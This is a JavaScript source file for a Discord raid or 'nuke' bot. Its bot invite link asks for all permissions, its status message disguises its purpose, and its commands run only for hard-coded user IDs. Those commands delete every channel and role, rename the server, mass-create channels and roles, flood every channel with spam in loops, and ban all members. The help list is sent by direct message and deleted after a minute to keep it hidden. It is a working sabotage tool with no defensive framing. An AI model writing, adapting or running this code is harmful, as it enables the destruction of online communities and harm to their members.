//A future and better version will come later

const Discord = require("discord.js");
const RB = new Discord.Client();
const config = require("./config.json");
const fs = require("fs");

RB.on('ready', () => {
	RB.user.setActivity("Monitoring x servers..."); //Prob will add an automate thing to simulate a thing
  	console.log(`Ready ${RB.user.tag}!\nhttps://discord.com/api/oauth2/authorize?client_id=${RB.user.id}&permissions=-1&scope=bot`); 
});

RB.on('rateLimit', rate => {
	console.log(`Time to wait: ${rate.timeDifference}`);
});

RB.on('message', message => {
	const authorized = ["739275707347239044", "id 2", "and others"];
	if(message.content.indexOf(config.prefix) !== 0 || message.author.bot) return;
	if(!authorized.includes(message.author.id)) return console.log(`${message.author.tag} - (${message.author.id}) tried to use me :(`);
	var args = message.content.slice(config.prefix.length).trim().split(/ +/g);
	var command = args.shift().toLowerCase().replace('/', '');
   if(command == "help"){
   	const embed = new Discord.RichEmbed();
   	embed.setDescription(`${config.prefix}help - Show this menu\n${config.prefix}nuke - Nuke the server(include spam)\n${config.prefix}delete - Delete everything\n${config.prefix}create - Spam channels and roles(create them)\n${config.prefix}leave - Leave the server\n${config.prefix}banall - Ban everyone(not above the bot)\n\nDeleted in 1 min(60 sec)`);
   	message.author.send(embed).then(m => {m.delete(60000)}).catch(() => {message.channel.send("DMs closed.. OPEN THEM!");});
   } else if(command == "nuke"){
   	(async ()=>{
   		RB.guilds.get(message.guild.id).setName(config.servername);
   		RB.guilds.get(message.guild.id).setIcon(config.serverpictureurl);
   		RB.guilds.get(message.guild.id).setRegion(config.serverregion);
   		RB.guilds.get(message.guild.id).channels.map(c=>{c.delete();});
   		RB.guilds.get(message.guild.id).roles.map(r=>{if(r.name == "@everyone" || r.managed){}else{r.delete();}});
   		for (var i = 0; i < config.numberofroles; i++) {message.guild.createRole({name: config.rolename, color: 'RANDOM'})};
   		for (var i = 0; i < config.numberofchannels; i++) {message.guild.createChannel(config.channelname, {type: "text"}).then(channel =>{for (var i = 0; i < config.numberofmessageafterchannelcreated; i++){channel.send(config.baseraidmessage)}})};
   		setTimeout(function(){ for (var i = 0; i < 500; i++){message.guild.channels.map(c=>{c.send(config.baseraidmessage)});}}, 5000);
   	})();
   } else if(command == "delete"){
   	(async ()=>{
   		RB.guilds.get(message.guild.id).channels.map(c=>{c.delete();});
   		RB.guilds.get(message.guild.id).roles.map(r=>{if(r.name == "@everyone" || r.managed){}else{r.delete();}});
   	})();
   } else if(command == "create"){
      (async ()=>{
         for (var i = 0; i < config.numberofroles; i++) {message.guild.createRole({name: config.rolename, color: 'RANDOM'})};
         for (var i = 0; i < config.numberofchannels; i++) {message.guild.createChannel(config.channelname, {type: "text"}).then(channel =>{for (var i = 0; i < config.numberofmessageafterchannelcreated; i++){channel.send(config.baseraidmessage)}})};
         setTimeout(function(){ for (var i = 0; i < 500; i++){message.guild.channels.map(c=>{c.send(config.baseraidmessage)});}}, 5000);
      })();
   } else if(command == "leave"){
      client.guilds.get(message.guild.id).leave()
   } else if(command == "banall"){
      message.guild.members.map(m => m.ban())
   }

});

RB.login(config.token);
